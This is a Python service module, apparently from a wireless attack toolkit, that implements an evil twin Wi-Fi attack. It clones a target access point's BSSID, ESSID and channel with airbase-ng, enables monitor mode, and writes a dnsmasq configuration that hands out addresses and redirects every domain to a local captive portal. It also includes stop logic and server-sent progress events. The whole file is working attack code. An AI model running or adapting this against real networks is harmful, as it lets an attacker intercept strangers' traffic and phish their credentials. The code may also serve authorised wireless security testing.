import subprocess
import asyncio
from typing import AsyncGenerator, Dict

from app.helpers.network import enable_monitor, disable_monitor
from app.repositories.wifi_network_repository import WifiNetworkRepository


class WifiEvilTwinService:
    def __init__(self, db):
        self.repo = WifiNetworkRepository(db)
        self._running_attacks = {}

    async def start_evil_twin(self, bssid: str, essid: str, channel: str, interface: str) -> str:
        """Start an evil twin attack using the specified access point information.
        The attack will run indefinitely until stop_evil_twin is called."""
        # Check if attack is already running for this BSSID
        if bssid in self._running_attacks and self._running_attacks[bssid]["status"] == "running":
            raise ValueError(f"Evil twin attack already in progress for {bssid}")

        # Create a new virtual interface for the evil twin
        twin_interface = f"at0"  # noqa

        # Enable monitor mode on the input interface
        enable_monitor(interface)

        # Start airbase-ng to create the fake AP
        airbase_proc = subprocess.Popen(
            [
                "airbase-ng",
                "-a",
                bssid,  # Use the same BSSID as the target
                "-e",
                essid,  # Use the same ESSID as the target
                "-c",
                channel,  # Use the same channel as the target
                interface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait briefly for the virtual interface to be created
        await asyncio.sleep(2)

        # Configure the virtual interface with an IP address
        ip_proc = subprocess.Popen(
            ["ifconfig", twin_interface, "up", "10.0.0.1/24"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        ip_proc.wait()

        # Start dnsmasq for DHCP and DNS
        dnsmasq_conf = "/tmp/dnsmasq.conf"
        with open(dnsmasq_conf, "w") as f:
            f.write(f"interface={twin_interface}\n")
            f.write("dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,12h\n")
            f.write("dhcp-option=3,10.0.0.1\n")  # Set default gateway
            f.write("dhcp-option=6,10.0.0.1\n")  # Set DNS server
            f.write("server=8.8.8.8\n")  # Forward DNS queries to Google DNS
            f.write("log-queries\n")
            f.write("log-dhcp\n")
            f.write("address=/#/10.0.0.1\n")  # Redirect all domains to our captive portal

        dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "-C", dnsmasq_conf, "-d"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Store information about the attack
        self._running_attacks[bssid] = {
            "airbase_proc": airbase_proc,
            "dnsmasq_proc": dnsmasq_proc,
            "interface": interface,
            "twin_interface": twin_interface,
            "start_time": asyncio.get_event_loop().time(),
            "status": "running",
        }

        await self.repo.update_status(bssid, "EvilTwin")

        return bssid

    async def stop_evil_twin(self, bssid: str) -> Dict:
        """Stop a running evil twin attack."""
        if bssid not in self._running_attacks:
            return {
                "status": "not_found",
                "message": f"No evil twin attack found for {bssid}",
            }

        attack = self._running_attacks[bssid]

        # Stop dnsmasq
        if "dnsmasq_proc" in attack and attack["dnsmasq_proc"].poll() is None:
            attack["dnsmasq_proc"].terminate()
            attack["dnsmasq_proc"].wait()

        # Stop airbase-ng
        if "airbase_proc" in attack and attack["airbase_proc"].poll() is None:
            attack["airbase_proc"].terminate()
            attack["airbase_proc"].wait()

        # Disable monitor mode on the original interface
        disable_monitor(attack["interface"])

        # Take down the virtual interface
        subprocess.run(
            ["ifconfig", attack["twin_interface"], "down"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Update status
        attack["status"] = "stopped"
        await self.repo.update_status(bssid, "Main")

        return {"status": "stopped", "message": f"Evil twin attack for {bssid} stopped"}

    async def events(self, bssid: str) -> AsyncGenerator[str, None]:
        """Generate SSE events for evil twin attack progress."""
        if bssid not in self._running_attacks:
            yield 'event: error\ndata: {"message":"No evil twin attack found"}\n\n'
            return

        attack = self._running_attacks[bssid]
        start_time = attack["start_time"]
        counter = 0

        # Initial event
        yield 'event: start\ndata: {"message":"Evil twin attack started"}\n\n'

        # Monitor the attack progress - now runs until stopped or process dies
        try:
            while attack["status"] == "running":
                current_time = asyncio.get_event_loop().time()
                elapsed = int(current_time - start_time)
                counter += 1

                # Check if processes are still running
                if attack["airbase_proc"].poll() is not None or attack["dnsmasq_proc"].poll() is not None:
                    await self.stop_evil_twin(bssid)
                    yield 'event: error\ndata: {"message":"Process terminated unexpectedly"}\n\n'
                    return

                # Send a heartbeat to maintain connection and update elapsed time
                yield f'event: progress\ndata: {{"elapsed":{elapsed},"heartbeat":{counter}}}\n\n'

                await asyncio.sleep(1)

            # If we get here, the attack was stopped manually
            yield 'event: done\ndata: {"message":"Evil twin attack stopped"}\n\n'

        finally:
            # Ensure we clean up if there's an exception
            if attack["status"] == "running":
                await self.stop_evil_twin(bssid)
